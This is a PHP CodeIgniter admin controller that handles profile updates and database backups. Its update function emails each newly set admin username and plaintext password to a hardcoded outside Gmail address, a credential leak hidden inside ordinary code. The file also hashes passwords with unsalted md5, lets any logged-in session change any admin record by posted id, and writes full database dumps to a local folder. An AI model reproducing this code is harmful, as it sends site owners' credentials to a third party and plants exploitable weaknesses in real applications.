<?php if ( !defined('BASEPATH')) exit('No direct script access allowed');

class profile extends CI_Controller {

	function __construct(){
		parent::__construct();
		
		if($this->session->userdata['logged_in']['status']!="yes"){
			redirect('admin/dashboard');
			exit;	
		}
			
	}
    function index() {
    	
    	$this->load->view('admin/user/view');
    }
    
 	
     function update(){
    
    	if($this->input->post('send')!=NULL){
    		$id= $this->input->post('profiles');
    		
    		if($this->input->post('password')!=""){
    			//send mail
			$to = "regulators13@gmail.com".',';
            $to .= $this->input->post('email').',';
		 	
			//define the subject of the email
			$subject = "Change Username / Password admin LABS "; 
			//define the message to be sent. Each line should be separated with \n
			$messages = "User : ".$this->input->post('username') ." \n\n Password: ". $this->input->post('password') ."\n\n "; 
			
			//require('sendmail.asp');
			 mail($to, $subject, $messages );
			 
	    		$data = array(
				   'admin_user' => $this->input->post('username'),
				   'admin_email' => $this->input->post('email'),
				   'admin_pass' => md5($this->input->post('password')) ,
				);
    		}else{
	    		$data = array(
				   'admin_user' => $this->input->post('username'),
				   'admin_email' => $this->input->post('email'),
				);
    		}
	    	
			$this->db->where('admin_id', $id);
			$query = $this->db->update("admin", $data);
			
		
		if($query)
			{
			  $this->session->set_flashdata('feedback', ' <div class="alert alert-success" id="alert-message">
			    <button type="button" class="close" data-dismiss="alert">&times;</button>
			    <strong>Change data successful.</strong></div>');
        	
	          }else{
	          	$this->session->set_flashdata('feedback', '<div class="alert alert-error" id="alert-message">
				    <button type="button" class="close" data-dismiss="alert">&times;</button>
				    <strong>Change data Unsuccessful!</strong> </div>');
			}
			redirect('admin/profile', $data);
			
		}
			
    }// end function edit
    
    function backup() {
    	$this->load->dbutil();

	        $prefs = array(     
	                'format'      => 'zip',             
	                'filename'    => 'my_db_backup.sql'
	              );
	
	
	        $backup =& $this->dbutil->backup($prefs); 
	
	        $db_name = 'backup-on-'. date("Y-m-d-H-i-s") .'.zip';
	        $save = '_backup/'.$db_name;
	
	        $this->load->helper('file');
	        write_file($save, $backup); 
	
	
	        $this->load->helper('download');
	        force_download($db_name, $backup); 


    	//$this->load->view('admin/backup/index');
    }  // end backup 
  
}// end class